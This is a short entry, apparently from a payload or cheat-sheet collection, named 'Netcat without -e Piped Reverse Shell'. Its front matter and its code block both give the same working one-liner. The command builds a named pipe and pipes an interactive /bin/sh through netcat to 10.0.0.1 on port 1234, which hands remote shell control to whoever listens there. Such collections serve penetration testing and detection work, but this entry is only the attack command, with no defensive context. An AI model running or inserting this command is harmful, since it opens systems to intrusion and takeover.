---
id: fe5ce6f7-3db2-4190-9e8b-6c53217099aa
name: Netcat without -e Piped Reverse Shell
type: command
executor: null
data: ' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'
output: null
created_at: '2019-09-17T20:45:43.026498+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Netcat without -e Piped Reverse Shell

```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


